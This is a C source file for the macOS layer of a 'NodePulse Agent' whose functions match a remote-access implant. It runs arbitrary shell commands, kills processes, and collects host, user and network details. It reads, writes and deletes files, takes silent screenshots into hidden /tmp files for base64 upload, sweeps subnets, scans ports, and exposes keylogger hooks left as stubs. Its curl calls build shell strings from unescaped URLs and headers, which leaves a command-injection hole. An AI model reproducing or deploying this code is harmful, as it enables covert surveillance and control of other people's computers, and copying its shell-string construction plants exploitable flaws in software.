/*
 * NodePulse Agent - macOS Platform Implementation
 */

#if defined(__APPLE__) && defined(__MACH__)

#include "platform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/mount.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>

/* ============================================================================
 * Base64 Encoding
 * ============================================================================ */

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* base64_encode(const unsigned char* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3);
    char* encoded = (char*)malloc(out_len + 1);
    if (!encoded) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < len;) {
        unsigned int a = i < len ? data[i++] : 0;
        unsigned int b = i < len ? data[i++] : 0;
        unsigned int c = i < len ? data[i++] : 0;
        unsigned int triple = (a << 16) | (b << 8) | c;
        
        encoded[j++] = b64_table[(triple >> 18) & 0x3F];
        encoded[j++] = b64_table[(triple >> 12) & 0x3F];
        encoded[j++] = (i > len + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        encoded[j++] = (i > len) ? '=' : b64_table[triple & 0x3F];
    }
    encoded[out_len] = '\0';
    return encoded;
}

unsigned char* base64_decode(const char* encoded, size_t* out_len) {
    *out_len = 0;
    return NULL;
}

/* ============================================================================
 * Initialization
 * ============================================================================ */

int platform_init(void) {
    srand((unsigned int)time(NULL) ^ getpid());
    return 0;
}

void platform_cleanup(void) {
    /* Nothing to clean up */
}

/* ============================================================================
 * HTTP Transport (using curl command)
 * ============================================================================ */

int http_post(const char* url, const char* data, size_t data_len,
              const char* content_type, HttpResponse* response) {
    if (!response) return -1;
    
    response->data = NULL;
    response->size = 0;
    response->status_code = 0;
    
    /* Write data to temp file */
    char temp_file[] = "/tmp/.agent_post_XXXXXX";
    int fd = mkstemp(temp_file);
    if (fd < 0) return -1;
    
    if (data && data_len > 0) {
        write(fd, data, data_len);
    }
    close(fd);
    
    /* Build curl command */
    char cmd[4096];
    snprintf(cmd, sizeof(cmd),
             "curl -s -w '\\n%%{http_code}' -X POST -H 'Content-Type: %s' "
             "-d @'%s' '%s' 2>/dev/null",
             content_type, temp_file, url);
    
    FILE* fp = popen(cmd, "r");
    unlink(temp_file);
    
    if (!fp) return -1;
    
    /* Read response */
    size_t capacity = 4096;
    response->data = (char*)malloc(capacity);
    response->size = 0;
    
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        if (response->size + len >= capacity) {
            capacity *= 2;
            response->data = (char*)realloc(response->data, capacity);
        }
        strcpy(response->data + response->size, buffer);
        response->size += len;
    }
    
    pclose(fp);
    
    /* Extract status code from last line */
    if (response->size > 0) {
        char* last_newline = strrchr(response->data, '\n');
        if (last_newline && last_newline > response->data) {
            /* Find the status code */
            char* code_start = last_newline;
            while (code_start > response->data && *(code_start - 1) != '\n') {
                code_start--;
            }
            response->status_code = atoi(code_start);
            /* Remove status code from response */
            *code_start = '\0';
            response->size = code_start - response->data;
            if (response->size > 0 && response->data[response->size - 1] == '\n') {
                response->data[--response->size] = '\0';
            }
        }
    }
    
    return 0;
}

/* HTTP POST with custom headers */
int http_post_with_headers(const char* url, const char* data, size_t data_len,
                           const char* content_type, const char** headers,
                           int header_count, HttpResponse* response) {
    if (!response) return -1;
    
    response->data = NULL;
    response->size = 0;
    response->status_code = 0;
    
    /* Write data to temp file */
    char temp_file[] = "/tmp/.agent_post_XXXXXX";
    int fd = mkstemp(temp_file);
    if (fd < 0) return -1;
    
    if (data && data_len > 0) {
        write(fd, data, data_len);
    }
    close(fd);
    
    /* Build curl command with custom headers */
    char cmd[8192];
    int offset = snprintf(cmd, sizeof(cmd),
             "curl -s -w '\\n%%{http_code}' -X POST -H 'Content-Type: %s' ",
             content_type);
    
    /* Add custom headers (key-value pairs) */
    for (int i = 0; i + 1 < header_count && offset < (int)sizeof(cmd) - 256; i += 2) {
        offset += snprintf(cmd + offset, sizeof(cmd) - offset, "-H '%s: %s' ", headers[i], headers[i + 1]);
    }
    
    snprintf(cmd + offset, sizeof(cmd) - offset, "-d @'%s' '%s' 2>/dev/null", temp_file, url);
    
    FILE* fp = popen(cmd, "r");
    unlink(temp_file);
    
    if (!fp) return -1;
    
    /* Read response */
    size_t capacity = 4096;
    response->data = (char*)malloc(capacity);
    response->size = 0;
    
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        if (response->size + len >= capacity) {
            capacity *= 2;
            response->data = (char*)realloc(response->data, capacity);
        }
        strcpy(response->data + response->size, buffer);
        response->size += len;
    }
    
    pclose(fp);
    
    /* Extract status code from last line */
    if (response->size > 0) {
        char* last_newline = strrchr(response->data, '\n');
        if (last_newline && last_newline > response->data) {
            char* code_start = last_newline;
            while (code_start > response->data && *(code_start - 1) != '\n') {
                code_start--;
            }
            response->status_code = atoi(code_start);
            *code_start = '\0';
            response->size = code_start - response->data;
            if (response->size > 0 && response->data[response->size - 1] == '\n') {
                response->data[--response->size] = '\0';
            }
        }
    }
    
    return 0;
}

int http_get(const char* url, HttpResponse* response) {
    if (!response) return -1;
    
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "curl -s -w '\\n%%{http_code}' '%s' 2>/dev/null", url);
    
    FILE* fp = popen(cmd, "r");
    if (!fp) return -1;
    
    size_t capacity = 4096;
    response->data = (char*)malloc(capacity);
    response->size = 0;
    
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        if (response->size + len >= capacity) {
            capacity *= 2;
            response->data = (char*)realloc(response->data, capacity);
        }
        strcpy(response->data + response->size, buffer);
        response->size += len;
    }
    
    pclose(fp);
    
    /* Extract status code */
    if (response->size > 0) {
        char* last_newline = strrchr(response->data, '\n');
        if (last_newline && last_newline > response->data) {
            char* code_start = last_newline;
            while (code_start > response->data && *(code_start - 1) != '\n') {
                code_start--;
            }
            response->status_code = atoi(code_start);
            *code_start = '\0';
            response->size = code_start - response->data;
            if (response->size > 0 && response->data[response->size - 1] == '\n') {
                response->data[--response->size] = '\0';
            }
        }
    }
    
    return 0;
}

void http_response_free(HttpResponse* response) {
    if (response && response->data) {
        free(response->data);
        response->data = NULL;
        response->size = 0;
    }
}

/* ============================================================================
 * Process Execution
 * ============================================================================ */

int run_command(const char* cmd, char** output, size_t* output_len) {
    if (!output) return -1;
    
    FILE* fp = popen(cmd, "r");
    if (!fp) return -1;
    
    size_t capacity = 4096;
    *output = (char*)malloc(capacity);
    size_t total = 0;
    
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        if (total + len >= capacity) {
            capacity *= 2;
            *output = (char*)realloc(*output, capacity);
        }
        strcpy(*output + total, buffer);
        total += len;
    }
    (*output)[total] = '\0';
    if (output_len) *output_len = total;
    
    int status = pclose(fp);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

int get_process_list(char** output) {
    return run_command("ps aux", output, NULL);
}

int kill_process(int pid) {
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "kill -9 %d", pid);
    return system(cmd);
}

/* ============================================================================
 * System Information
 * ============================================================================ */

int get_hostname(char* buf, size_t len) {
    return gethostname(buf, len);
}

int get_username(char* buf, size_t len) {
    char* user = getenv("USER");
    if (user) {
        strncpy(buf, user, len - 1);
        buf[len - 1] = '\0';
        return 0;
    }
    return -1;
}

int get_os_info(char* buf, size_t len) {
    FILE* fp = popen("sw_vers -productName && sw_vers -productVersion", "r");
    if (!fp) {
        strncpy(buf, "macOS", len);
        return 0;
    }
    
    char name[64] = {0}, version[64] = {0};
    fgets(name, sizeof(name), fp);
    fgets(version, sizeof(version), fp);
    pclose(fp);
    
    /* Trim newlines */
    name[strcspn(name, "\n")] = '\0';
    version[strcspn(version, "\n")] = '\0';
    
    snprintf(buf, len, "%s %s", name, version);
    return 0;
}

int get_arch_info(char* buf, size_t len) {
    FILE* fp = popen("uname -m", "r");
    if (!fp) return -1;
    
    if (fgets(buf, len, fp)) {
        buf[strcspn(buf, "\n")] = '\0';
    }
    pclose(fp);
    return 0;
}

int get_internal_ip(char* buf, size_t len) {
    struct ifaddrs *ifaddr, *ifa;
    
    if (getifaddrs(&ifaddr) == -1) return -1;
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (strcmp(ifa->ifa_name, "lo0") == 0) continue;
        
        struct sockaddr_in* addr = (struct sockaddr_in*)ifa->ifa_addr;
        inet_ntop(AF_INET, &addr->sin_addr, buf, len);
        freeifaddrs(ifaddr);
        return 0;
    }
    
    freeifaddrs(ifaddr);
    return -1;
}

int get_external_ip(char* buf, size_t len, const char* service_url) {
    HttpResponse response = {0};
    if (http_get(service_url, &response) != 0) return -1;
    
    if (response.data && response.size > 0) {
        strncpy(buf, response.data, len - 1);
        buf[len - 1] = '\0';
        /* Trim whitespace */
        char* end = buf + strlen(buf) - 1;
        while (end > buf && (*end == '\n' || *end == '\r' || *end == ' ')) {
            *end-- = '\0';
        }
    }
    
    http_response_free(&response);
    return 0;
}

int get_mac_address(char* buf, size_t len) {
    struct ifaddrs *ifaddr, *ifa;
    
    if (getifaddrs(&ifaddr) == -1) return -1;
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family != AF_LINK) continue;
        if (strcmp(ifa->ifa_name, "en0") != 0) continue;
        
        struct sockaddr_dl* sdl = (struct sockaddr_dl*)ifa->ifa_addr;
        unsigned char* mac = (unsigned char*)LLADDR(sdl);
        
        snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        
        freeifaddrs(ifaddr);
        return 0;
    }
    
    freeifaddrs(ifaddr);
    return -1;
}

long get_system_uptime(void) {
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) return -1;
    
    time_t now = time(NULL);
    return (long)(now - boottime.tv_sec);
}

int get_memory_info(char** output) {
    mach_port_t host = mach_host_self();
    vm_size_t page_size;
    vm_statistics64_data_t vm_stat;
    mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
    
    host_page_size(host, &page_size);
    
    if (host_statistics64(host, HOST_VM_INFO64, (host_info64_t)&vm_stat, &count) != KERN_SUCCESS) {
        return -1;
    }
    
    /* Get total physical memory */
    int64_t total_mem;
    size_t len = sizeof(total_mem);
    sysctlbyname("hw.memsize", &total_mem, &len, NULL, 0);
    
    unsigned long long free_mem = (unsigned long long)vm_stat.free_count * page_size;
    unsigned long long used_mem = total_mem - free_mem;
    int percent = (int)((used_mem * 100) / total_mem);
    
    *output = (char*)malloc(256);
    snprintf(*output, 256,
             "{\"total\":%lld,\"available\":%llu,\"used\":%llu,\"percent\":%d}",
             total_mem, free_mem, used_mem, percent);
    return 0;
}

int get_disk_info(char** output) {
    struct statfs stat;
    if (statfs("/", &stat) != 0) return -1;
    
    unsigned long long total = (unsigned long long)stat.f_blocks * stat.f_bsize;
    unsigned long long free_space = (unsigned long long)stat.f_bfree * stat.f_bsize;
    unsigned long long used = total - free_space;
    
    *output = (char*)malloc(256);
    snprintf(*output, 256,
             "{\"total\":%llu,\"free\":%llu,\"used\":%llu}",
             total, free_space, used);
    return 0;
}

/* ============================================================================
 * File Operations
 * ============================================================================ */

int file_read(const char* path, char** content, size_t* len) {
    FILE* f = fopen(path, "rb");
    if (!f) return -1;
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    *content = (char*)malloc(size + 1);
    fread(*content, 1, size, f);
    (*content)[size] = '\0';
    if (len) *len = size;
    
    fclose(f);
    return 0;
}

int file_write(const char* path, const char* content, size_t len) {
    FILE* f = fopen(path, "wb");
    if (!f) return -1;
    fwrite(content, 1, len, f);
    fclose(f);
    return 0;
}

int file_append(const char* path, const char* content, size_t len) {
    FILE* f = fopen(path, "ab");
    if (!f) return -1;
    fwrite(content, 1, len, f);
    fclose(f);
    return 0;
}

int file_delete(const char* path) {
    return unlink(path);
}

int file_exists(const char* path) {
    return access(path, F_OK) == 0 ? 1 : 0;
}

long file_size(const char* path) {
    struct stat st;
    if (stat(path, &st) != 0) return -1;
    return (long)st.st_size;
}

int file_list(const char* path, char** output) {
    DIR* dir = opendir(path);
    if (!dir) return -1;
    
    size_t capacity = 4096;
    *output = (char*)malloc(capacity);
    size_t pos = 1;
    (*output)[0] = '[';
    
    int first = 1;
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        
        char full_path[PATH_MAX];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        struct stat st;
        stat(full_path, &st);
        
        char item[1024];
        snprintf(item, sizeof(item), "%s{\"name\":\"%s\",\"is_dir\":%s,\"size\":%lld}",
                 first ? "" : ",", entry->d_name,
                 S_ISDIR(st.st_mode) ? "true" : "false",
                 (long long)st.st_size);
        first = 0;
        
        size_t item_len = strlen(item);
        if (pos + item_len + 2 >= capacity) {
            capacity *= 2;
            *output = (char*)realloc(*output, capacity);
        }
        strcpy(*output + pos, item);
        pos += item_len;
    }
    
    closedir(dir);
    
    (*output)[pos++] = ']';
    (*output)[pos] = '\0';
    return 0;
}

int dir_create(const char* path) {
    return mkdir(path, 0755);
}

/* ============================================================================
 * Screenshot
 * ============================================================================ */

int capture_screenshot(char** base64_data) {
    /* Use screencapture command */
    int result = system("screencapture -x /tmp/.screenshot.png");
    if (result != 0) return -1;
    
    char* output = NULL;
    result = run_command("base64 -i /tmp/.screenshot.png && rm /tmp/.screenshot.png", &output, NULL);
    
    if (result == 0 && output) {
        /* Remove newlines from base64 */
        char* p = output;
        char* q = output;
        while (*p) {
            if (*p != '\n' && *p != '\r') {
                *q++ = *p;
            }
            p++;
        }
        *q = '\0';
        *base64_data = output;
        return 0;
    }
    
    if (output) free(output);
    return -1;
}

/* ============================================================================
 * Network Scanning
 * ============================================================================ */

int network_scan_hosts(const char* subnet, char** output) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), 
             "for i in $(seq 1 254); do (ping -c1 -W1 %s.$i >/dev/null 2>&1 && echo %s.$i) & done; wait",
             subnet, subnet);
    return run_command(cmd, output, NULL);
}

int network_scan_ports(const char* host, int* ports, int port_count, char** output) {
    size_t capacity = 1024;
    *output = (char*)malloc(capacity);
    size_t pos = 1;
    (*output)[0] = '[';
    
    int first = 1;
    for (int i = 0; i < port_count; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ports[i]);
        inet_pton(AF_INET, host, &addr.sin_addr);
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);
        
        struct timeval tv = {0, 500000};
        int result = select(sock + 1, NULL, &writefds, NULL, &tv);
        
        if (result > 0) {
            char entry[64];
            snprintf(entry, sizeof(entry), "%s%d", first ? "" : ",", ports[i]);
            first = 0;
            
            size_t entry_len = strlen(entry);
            if (pos + entry_len + 2 >= capacity) {
                capacity *= 2;
                *output = (char*)realloc(*output, capacity);
            }
            strcpy(*output + pos, entry);
            pos += entry_len;
        }
        
        close(sock);
    }
    
    (*output)[pos++] = ']';
    (*output)[pos] = '\0';
    return 0;
}

int get_network_interfaces(char** output) {
    return run_command("ifconfig", output, NULL);
}

/* ============================================================================
 * Keylogger (Not implemented on macOS)
 * ============================================================================ */

int keylogger_start(void) {
    return -1;
}

int keylogger_stop(void) {
    return 0;
}

int keylogger_get_buffer(char** output) {
    *output = strdup("");
    return 0;
}

/* ============================================================================
 * Utility Functions
 * ============================================================================ */

void platform_sleep(int milliseconds) {
    usleep(milliseconds * 1000);
}

long platform_time(void) {
    return (long)time(NULL);
}

int platform_random(unsigned char* buf, size_t len) {
    arc4random_buf(buf, len);
    return 0;
}

char* url_encode(const char* str) {
    size_t len = strlen(str);
    char* encoded = (char*)malloc(len * 3 + 1);
    char* p = encoded;
    
    for (size_t i = 0; i < len; i++) {
        char c = str[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            *p++ = c;
        } else {
            sprintf(p, "%%%02X", (unsigned char)c);
            p += 3;
        }
    }
    *p = '\0';
    return encoded;
}

#endif /* __APPLE__ && __MACH__ */
